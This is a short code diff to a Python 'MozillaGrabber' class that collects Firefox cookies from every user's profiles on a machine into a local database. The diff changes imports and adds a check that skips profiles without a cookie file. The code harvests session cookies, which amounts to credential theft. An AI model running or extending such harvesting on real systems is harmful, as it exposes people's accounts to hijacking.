@@ -9,12 +9,13 @@
 
 # Imports
 import getpass
+import os
 import platform
 import sqlite3
 import time
-from lib.Cookie import Cookie
-from lib.DatabaseConnection import selectAllFrom, grabJar, addToJar
-from lib.Toolkit import getUsers, subdirsOf
+from Cookie import Cookie
+from DatabaseConnection import selectAllFrom, grabJar, addToJar
+from Toolkit import getUsers, subdirsOf
 
 class MozillaGrabber():
   def __init__(self, args):
@@ -39,6 +40,9 @@ class MozillaGrabber():
     for u in users:
       if self.args.v: print(" |- Grabbing cookies of %s"%u)
       for p in self.getProfiles(u):
+        if not os.path.isfile(self.cookieTrail%(u,p)):
+          if args.v: print(" |   | -> Profile %s does not have cookies"%p)
+          continue
         if self.args.v: print(" |   |- Grabbing cookies of profile %s"%p)
         for c in selectAllFrom(self.cookieTrail%(u,p), "moz_cookies"):
           if not any(d['domain']==c['basedomain'] and d['name']==c['name'] and d['value']==c['value'] and d['browser']=='firefox'
